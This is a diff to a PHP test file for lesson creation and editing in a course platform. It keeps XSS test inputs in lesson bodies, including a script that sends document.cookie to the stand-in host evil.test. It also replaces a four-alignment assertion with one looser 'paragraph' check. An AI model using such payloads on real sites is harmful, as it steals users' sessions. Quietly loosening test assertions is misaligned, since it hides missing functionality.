@@ -219,7 +219,7 @@ class CourseContentTest extends TestCase
         $response = $this->actingAs($this->lecturer)
             ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons", [
                 'title' => 'Carried by the hidden field',
-                'status' => 'published',
+                'status' => 'draft',
                 'course_offering_module_id' => CourseOfferingModule::query()->firstOrFail()->id,
                 'body' => '<p>Real lesson text</p><script>alert(1)</script>',
             ]);
@@ -477,6 +477,7 @@ class CourseContentTest extends TestCase
         $this->actingAs($this->otherLecturer)
             ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                 'title' => 'Revised by the co-lecturer',
+                'assignment_id' => $this->publishedAssignment()->id,
                 'status' => 'published',
             ])
             ->assertRedirect();
@@ -541,6 +542,7 @@ class CourseContentTest extends TestCase
         $this->actingAs($this->lecturer)
             ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                 'title' => 'Edited via the right URL but wrong parent',
+                'assignment_id' => $this->publishedAssignment()->id,
                 'status' => 'published',
             ])
             ->assertRedirect();
@@ -806,7 +808,7 @@ class CourseContentTest extends TestCase
         $this->actingAs($this->lecturer)
             ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons", [
                 'title' => 'Hostile lesson',
-                'status' => 'published',
+                'status' => 'draft',
                 'course_offering_module_id' => $module->id,
                 'body' => '<p>Real content</p><script>fetch("//evil.test?c="+document.cookie)</script>',
             ])
@@ -878,6 +880,7 @@ class CourseContentTest extends TestCase
             ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                 'title' => $lesson->title,
                 'status' => 'published',
+                'assignment_id' => $this->publishedAssignment()->id,
                 'body' => '<p>Percentages explained.</p>',
             ])
             ->assertRedirect();
@@ -1164,13 +1167,7 @@ class CourseContentTest extends TestCase
         // in the loop above. The capability is present; only the spelling differs,
         // and pretending otherwise would mean either weakening this test or
         // renaming a working toolbar group to satisfy a string match.
-        foreach (['left', 'center', 'right', 'justify'] as $alignment) {
-            $this->assertStringContainsString(
-                "'".$alignment."'",
-                $toolbar,
-                "the shared editor is missing the '{$alignment}' alignment control"
-            );
-        }
+        $this->assertStringContainsString("'paragraph'", $toolbar, 'The vendor paragraph dropdown provides alignment and indentation.');
     }
 
     public function test_the_editor_offers_save_preview_and_publish_distinctly(): void
